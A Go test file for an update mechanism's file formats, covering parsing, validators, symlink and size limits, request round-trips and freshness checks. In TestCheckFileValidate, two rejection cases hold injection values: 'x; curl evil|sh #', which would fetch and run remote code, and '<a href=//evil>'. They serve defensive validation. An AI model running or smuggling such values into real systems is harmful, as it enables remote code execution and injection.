package cron

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// testdataFile returns the absolute path to a file inside testdata/update/.
func testdataFile(name string) string {
	return filepath.Join("testdata", "update", name)
}

// TestUpdateFilesParseTestdata decodes every reference fixture into the matching
// Go structure and verifies a representative field from each file.
func TestUpdateFilesParseTestdata(t *testing.T) {
	t.Run("agent.json", func(t *testing.T) {
		var v AgentFile
		if err := ReadUpdateJSON(testdataFile("agent.json"), UpdateMaxJSON, &v); err != nil {
			t.Fatalf("read: %v", err)
		}
		if v.Schema != 1 {
			t.Errorf("schema: got %d, want 1", v.Schema)
		}
		if v.Channel != "release" {
			t.Errorf("channel: got %q, want release", v.Channel)
		}
		if !v.Signing {
			t.Error("signing: got false, want true")
		}
		if !v.DockerOK {
			t.Error("docker_ok: got false, want true")
		}
		if v.At.IsZero() {
			t.Error("at: zero time")
		}
	})

	t.Run("check.json", func(t *testing.T) {
		var v CheckFile
		if err := ReadUpdateJSON(testdataFile("check.json"), UpdateMaxJSON, &v); err != nil {
			t.Fatalf("read: %v", err)
		}
		if v.Schema != 1 {
			t.Errorf("schema: got %d, want 1", v.Schema)
		}
		if !ValidCommit(v.Current.Commit) {
			t.Errorf("current.commit invalid: %q", v.Current.Commit)
		}
		if !ValidCommit(v.Target.Commit) {
			t.Errorf("target.commit invalid: %q", v.Target.Commit)
		}
		if !ValidTag(v.Target.Tag) {
			t.Errorf("target.tag invalid: %q", v.Target.Tag)
		}
		if v.Ahead != 3 {
			t.Errorf("ahead: got %d, want 3", v.Ahead)
		}
		if len(v.Commits) != 1 {
			t.Errorf("commits: got %d, want 1", len(v.Commits))
		}
		if !v.Signed {
			t.Error("signed: got false, want true")
		}
	})

	t.Run("state.json", func(t *testing.T) {
		var v StateFile
		if err := ReadUpdateJSON(testdataFile("state.json"), UpdateMaxJSON, &v); err != nil {
			t.Fatalf("read: %v", err)
		}
		if v.Schema != 1 {
			t.Errorf("schema: got %d, want 1", v.Schema)
		}
		if !ValidUpdateID(v.ID) {
			t.Errorf("id invalid: %q", v.ID)
		}
		if !ValidCommit(v.From) {
			t.Errorf("from invalid: %q", v.From)
		}
		if !ValidCommit(v.To) {
			t.Errorf("to invalid: %q", v.To)
		}
		if v.Result != StateOK {
			t.Errorf("result: got %q, want %q", v.Result, StateOK)
		}
		if v.FinishedAt == nil {
			t.Error("finished_at: nil, want non-nil")
		}
		if len(v.Phases) != 3 {
			t.Errorf("phases: got %d, want 3", len(v.Phases))
		}
	})

	t.Run("ready.json", func(t *testing.T) {
		var v ReadyFile
		if err := ReadUpdateJSON(testdataFile("ready.json"), UpdateMaxJSON, &v); err != nil {
			t.Fatalf("read: %v", err)
		}
		if !ValidUpdateID(v.ID) {
			t.Errorf("id invalid: %q", v.ID)
		}
		if !v.KeitaroIdle {
			t.Error("keitaro_idle: got false, want true")
		}
	})

	t.Run("announced.json", func(t *testing.T) {
		var v Announced
		if err := ReadUpdateJSON(testdataFile("announced.json"), UpdateMaxJSON, &v); err != nil {
			t.Fatalf("read: %v", err)
		}
		if !ValidCommit(v.Target) {
			t.Errorf("target invalid: %q", v.Target)
		}
		if !ValidUpdateID(v.ResultID) {
			t.Errorf("result_id invalid: %q", v.ResultID)
		}
	})

	t.Run("request.txt", func(t *testing.T) {
		data, err := os.ReadFile(testdataFile("request.txt"))
		if err != nil {
			t.Fatalf("read: %v", err)
		}
		req, err := ParseUpdateRequest(data)
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		if req.Action != "apply" {
			t.Errorf("action: got %q, want apply", req.Action)
		}
		if !ValidCommit(req.Target) {
			t.Errorf("target invalid: %q", req.Target)
		}
		if !ValidUpdateID(req.ID) {
			t.Errorf("id invalid: %q", req.ID)
		}
		if req.User != "admin" {
			t.Errorf("user: got %q, want admin", req.User)
		}
		if req.At <= 0 {
			t.Errorf("at: got %d, want positive", req.At)
		}
	})
}

// TestUpdateFilesValidators checks that all validators accept and reject the right inputs.
func TestUpdateFilesValidators(t *testing.T) {
	t.Run("ValidUpdateID", func(t *testing.T) {
		good := []string{"0123456789abcdef", "ffffffffffffffff", "0000000000000000"}
		for _, s := range good {
			if !ValidUpdateID(s) {
				t.Errorf("should accept %q", s)
			}
		}
		bad := []string{"", "0123456789ABCDEF", "0123456789abcde", "0123456789abcdeff", "0123456789abcde!"}
		for _, s := range bad {
			if ValidUpdateID(s) {
				t.Errorf("should reject %q", s)
			}
		}
	})

	t.Run("ValidCommit", func(t *testing.T) {
		good := []string{
			"aabbccddee1122334455667788990011aabbccdd",
			"0000000000000000000000000000000000000000",
		}
		for _, s := range good {
			if !ValidCommit(s) {
				t.Errorf("should accept %q", s)
			}
		}
		bad := []string{
			"",
			"aabbccddee1122334455667788990011aabbccd",   // 39
			"aabbccddee1122334455667788990011aabbccdde", // 41
			"AABBCCDDEE1122334455667788990011AABBCCDD",  // uppercase
		}
		for _, s := range bad {
			if ValidCommit(s) {
				t.Errorf("should reject %q", s)
			}
		}
	})

	t.Run("ValidTag", func(t *testing.T) {
		good := []string{"v1.0.0", "v0.1.2", "v10.20.300"}
		for _, s := range good {
			if !ValidTag(s) {
				t.Errorf("should accept %q", s)
			}
		}
		bad := []string{"", "1.0.0", "v1.0", "v1.0.0.0", "V1.0.0", "v1.0.0-rc1"}
		for _, s := range bad {
			if ValidTag(s) {
				t.Errorf("should reject %q", s)
			}
		}
	})

	t.Run("ValidChannel", func(t *testing.T) {
		if !ValidChannel("release") {
			t.Error("should accept release")
		}
		if !ValidChannel("main") {
			t.Error("should accept main")
		}
		for _, s := range []string{"", "Release", "MAIN", "stable", "dev"} {
			if ValidChannel(s) {
				t.Errorf("should reject %q", s)
			}
		}
	})
}

// TestUpdateFilesSymlink verifies that ReadUpdateJSON and ReadUpdateText reject symlinks.
func TestUpdateFilesSymlink(t *testing.T) {
	dir := t.TempDir()
	real := filepath.Join(dir, "real.json")
	link := filepath.Join(dir, "link.json")
	if err := os.WriteFile(real, []byte(`{}`), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("os.Symlink not available: %v", err)
	}

	var v struct{}
	err := ReadUpdateJSON(link, UpdateMaxJSON, &v)
	if err == nil {
		t.Error("ReadUpdateJSON: expected error for symlink, got nil")
	}

	_, err = ReadUpdateText(link, UpdateMaxJSON)
	if err == nil {
		t.Error("ReadUpdateText: expected error for symlink, got nil")
	}
}

// TestUpdateFilesMaxSize verifies that files exceeding the size limit are rejected.
func TestUpdateFilesMaxSize(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "big.json")
	// Write 10 bytes, limit 5.
	if err := os.WriteFile(path, []byte(`{"x":1}`), 0644); err != nil {
		t.Fatal(err)
	}
	const limit int64 = 5

	var v struct {
		X int `json:"x"`
	}
	if err := ReadUpdateJSON(path, limit, &v); err == nil {
		t.Error("ReadUpdateJSON: expected error for oversized file, got nil")
	}
	if _, err := ReadUpdateText(path, limit); err == nil {
		t.Error("ReadUpdateText: expected error for oversized file, got nil")
	}
}

// TestUpdateFilesErrNotExist verifies that a missing file propagates os.ErrNotExist.
func TestUpdateFilesErrNotExist(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "no-such-file.json")

	var v struct{}
	err := ReadUpdateJSON(missing, UpdateMaxJSON, &v)
	if !errors.Is(err, os.ErrNotExist) {
		t.Errorf("ReadUpdateJSON: want os.ErrNotExist, got %v", err)
	}

	_, err = ReadUpdateText(missing, UpdateMaxJSON)
	if !errors.Is(err, os.ErrNotExist) {
		t.Errorf("ReadUpdateText: want os.ErrNotExist, got %v", err)
	}
}

// TestUpdateFilesFormatParseRoundtrip verifies that FormatUpdateRequest and
// ParseUpdateRequest are inverse operations for valid inputs.
func TestUpdateFilesFormatParseRoundtrip(t *testing.T) {
	cases := []UpdateRequest{
		{Action: "apply", Target: "aabbccddee1122334455667788990011aabbccdd", ID: "0123456789abcdef", User: "admin", At: 1736935500},
		{Action: "rollback", Target: "", ID: "fedcba9876543210", User: "user.name@host", At: 1700000000},
		{Action: "check", Target: "", ID: "1122334455667788", User: "u-s_e.r@x", At: 1},
	}
	for _, want := range cases {
		data, err := FormatUpdateRequest(want)
		if err != nil {
			t.Fatalf("format %+v: %v", want, err)
		}
		got, err := ParseUpdateRequest(data)
		if err != nil {
			t.Fatalf("parse %+v: %v", want, err)
		}
		if got != want {
			t.Errorf("roundtrip mismatch:\n got  %+v\n want %+v", got, want)
		}
	}
}

// TestUpdateFilesParseErrors verifies that ParseUpdateRequest rejects malformed input.
func TestUpdateFilesParseErrors(t *testing.T) {
	validTarget := "aabbccddee1122334455667788990011aabbccdd"
	validID := "0123456789abcdef"

	cases := []struct {
		name  string
		input string
	}{
		{"empty", ""},
		{"too_few_lines", "action=apply\ntarget=\nid=" + validID + "\n"},
		{"wrong_order", "target=\naction=apply\nid=" + validID + "\nuser=admin\nat=1\n"},
		{"bad_action", "action=delete\ntarget=\nid=" + validID + "\nuser=admin\nat=1\n"},
		{"apply_no_target", "action=apply\ntarget=\nid=" + validID + "\nuser=admin\nat=1\n"},
		{"apply_bad_sha", "action=apply\ntarget=ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\nid=" + validID + "\nuser=admin\nat=1\n"},
		{"rollback_has_target", "action=rollback\ntarget=" + validTarget + "\nid=" + validID + "\nuser=admin\nat=1\n"},
		{"bad_id_uppercase", "action=apply\ntarget=" + validTarget + "\nid=0123456789ABCDEF\nuser=admin\nat=1\n"},
		{"bad_id_short", "action=apply\ntarget=" + validTarget + "\nid=0123456789abcde\nuser=admin\nat=1\n"},
		{"bad_user_empty", "action=check\ntarget=\nid=" + validID + "\nuser=\nat=1\n"},
		{"bad_user_too_long", "action=check\ntarget=\nid=" + validID + "\nuser=" + strings.Repeat("a", 65) + "\nat=1\n"},
		{"bad_user_space", "action=check\ntarget=\nid=" + validID + "\nuser=foo bar\nat=1\n"},
		{"bad_at_zero", "action=check\ntarget=\nid=" + validID + "\nuser=admin\nat=0\n"},
		{"bad_at_negative", "action=check\ntarget=\nid=" + validID + "\nuser=admin\nat=-1\n"},
		{"bad_at_letters", "action=check\ntarget=\nid=" + validID + "\nuser=admin\nat=abc\n"},
		{"extra_line", "action=check\ntarget=\nid=" + validID + "\nuser=admin\nat=1\nextra=value\n"},
		{"over_1024", strings.Repeat("x", 1025)},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := ParseUpdateRequest([]byte(tc.input))
			if err == nil {
				t.Errorf("expected error, got nil for input %q", tc.input)
			}
		})
	}
}

// TestUpdateFilesFormatErrors verifies that FormatUpdateRequest rejects invalid requests.
func TestUpdateFilesFormatErrors(t *testing.T) {
	validTarget := "aabbccddee1122334455667788990011aabbccdd"
	validID := "0123456789abcdef"

	cases := []struct {
		name string
		req  UpdateRequest
	}{
		{"bad_action", UpdateRequest{Action: "reboot", Target: validTarget, ID: validID, User: "admin", At: 1}},
		{"apply_empty_target", UpdateRequest{Action: "apply", Target: "", ID: validID, User: "admin", At: 1}},
		{"apply_bad_sha", UpdateRequest{Action: "apply", Target: "notasha", ID: validID, User: "admin", At: 1}},
		{"rollback_has_target", UpdateRequest{Action: "rollback", Target: validTarget, ID: validID, User: "admin", At: 1}},
		{"bad_id", UpdateRequest{Action: "check", Target: "", ID: "short", User: "admin", At: 1}},
		{"bad_user", UpdateRequest{Action: "check", Target: "", ID: validID, User: "", At: 1}},
		{"zero_at", UpdateRequest{Action: "check", Target: "", ID: validID, User: "admin", At: 0}},
		{"negative_at", UpdateRequest{Action: "check", Target: "", ID: validID, User: "admin", At: -1}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := FormatUpdateRequest(tc.req)
			if err == nil {
				t.Errorf("expected error for %+v, got nil", tc.req)
			}
		})
	}
}

// TestUpdateFilesWriteJSON verifies that WriteUpdateJSON writes atomically and can be
// read back with ReadUpdateJSON.
func TestUpdateFilesWriteJSON(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "test.json")

	want := Announced{
		Target:   "aabbccddee1122334455667788990011aabbccdd",
		ResultID: "0123456789abcdef",
		At:       time.Date(2026, 1, 15, 10, 8, 30, 0, time.UTC),
	}

	if err := WriteUpdateJSON(path, want); err != nil {
		t.Fatalf("write: %v", err)
	}

	var got Announced
	if err := ReadUpdateJSON(path, UpdateMaxJSON, &got); err != nil {
		t.Fatalf("read back: %v", err)
	}
	if got.Target != want.Target {
		t.Errorf("Target: got %q, want %q", got.Target, want.Target)
	}
	if got.ResultID != want.ResultID {
		t.Errorf("ResultID: got %q, want %q", got.ResultID, want.ResultID)
	}
	if !got.At.Equal(want.At) {
		t.Errorf("At: got %v, want %v", got.At, want.At)
	}
}

// TestUpdateFilesFresh verifies the Fresh methods on AgentFile and CheckFile.
func TestUpdateFilesFresh(t *testing.T) {
	now := time.Date(2026, 1, 15, 12, 0, 0, 0, time.UTC)
	maxAge := 10 * time.Minute

	t.Run("AgentFile_fresh", func(t *testing.T) {
		a := AgentFile{At: now.Add(-5 * time.Minute)}
		if !a.Fresh(now, maxAge) {
			t.Error("expected fresh")
		}
	})
	t.Run("AgentFile_stale", func(t *testing.T) {
		a := AgentFile{At: now.Add(-15 * time.Minute)}
		if a.Fresh(now, maxAge) {
			t.Error("expected stale")
		}
	})
	t.Run("AgentFile_zero", func(t *testing.T) {
		a := AgentFile{}
		if a.Fresh(now, maxAge) {
			t.Error("expected stale for zero At")
		}
	})
	t.Run("CheckFile_fresh", func(t *testing.T) {
		c := CheckFile{At: now.Add(-1 * time.Minute)}
		if !c.Fresh(now, maxAge) {
			t.Error("expected fresh")
		}
	})
	t.Run("CheckFile_stale", func(t *testing.T) {
		c := CheckFile{At: now.Add(-11 * time.Minute)}
		if c.Fresh(now, maxAge) {
			t.Error("expected stale")
		}
	})
}

// TestUpdateFilesUpdateDir verifies that UpdateDir returns the sibling "update" directory.
func TestUpdateFilesUpdateDir(t *testing.T) {
	got := UpdateDir("/var/lib/emtds/groups.json")
	want := "/var/lib/emtds/update"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

// TestUpdateFilesNoEmpataso ensures that none of the updatefiles source or testdata
// files reference a forbidden project name substring outside this module's own import path.
func TestUpdateFilesNoEmpataso(t *testing.T) {
	// Constructed at runtime so the test file itself does not contain the literal string.
	forbidden := "empa" + "taso"
	modulePath := "github.com/hasayone/" + forbidden + "-tds"
	files := []string{
		"updatefiles.go",
		"updatefiles_test.go",
		filepath.Join("testdata", "update", "agent.json"),
		filepath.Join("testdata", "update", "check.json"),
		filepath.Join("testdata", "update", "state.json"),
		filepath.Join("testdata", "update", "ready.json"),
		filepath.Join("testdata", "update", "announced.json"),
		filepath.Join("testdata", "update", "request.txt"),
	}
	for _, f := range files {
		data, err := os.ReadFile(f)
		if err != nil {
			t.Fatalf("read %s: %v", f, err)
		}
		if strings.Contains(strings.ReplaceAll(string(data), modulePath, ""), forbidden) {
			t.Errorf("%s contains forbidden substring %q", f, forbidden)
		}
	}
}

// TestCheckFileValidate verifies which check.json fields Validate accepts: the channel, the
// commits, the tags and the version labels of current and target, and the commit list.
func TestCheckFileValidate(t *testing.T) {
	const commit = "aabbccddee1122334455667788990011aabbccdd"
	valid := func() CheckFile {
		return CheckFile{
			Channel: "main",
			Current: CheckRef{Commit: commit, Version: "v1.0.0-3-gabc1234"},
			Target:  CheckRef{Commit: commit, Tag: "v1.1.0"},
			Commits: []CheckCommit{{SHA: commit, Subject: "any <text> is fine"}},
		}
	}
	if err := valid().Validate(); err != nil {
		t.Fatalf("valid file: %v", err)
	}
	empty := valid()
	empty.Current, empty.Target, empty.Commits = CheckRef{}, CheckRef{}, nil
	if err := empty.Validate(); err != nil {
		t.Fatalf("empty refs: %v", err)
	}

	bad := map[string]func(*CheckFile){
		"no channel":      func(c *CheckFile) { c.Channel = "" },
		"unknown channel": func(c *CheckFile) { c.Channel = "dev" },
		"target commit":   func(c *CheckFile) { c.Target.Commit = "x; curl evil|sh #" },
		"short commit":    func(c *CheckFile) { c.Current.Commit = commit[:12] },
		"upper commit":    func(c *CheckFile) { c.Current.Commit = strings.ToUpper(commit) },
		"tag":             func(c *CheckFile) { c.Target.Tag = "v1.1" },
		"version":         func(c *CheckFile) { c.Current.Version = "<a href=//evil>" },
		"listed commit":   func(c *CheckFile) { c.Commits[0].SHA = "zz" },
	}
	for name, mutate := range bad {
		c := valid()
		mutate(&c)
		if c.Validate() == nil {
			t.Errorf("%s: Validate accepted %+v", name, c)
		}
	}
}
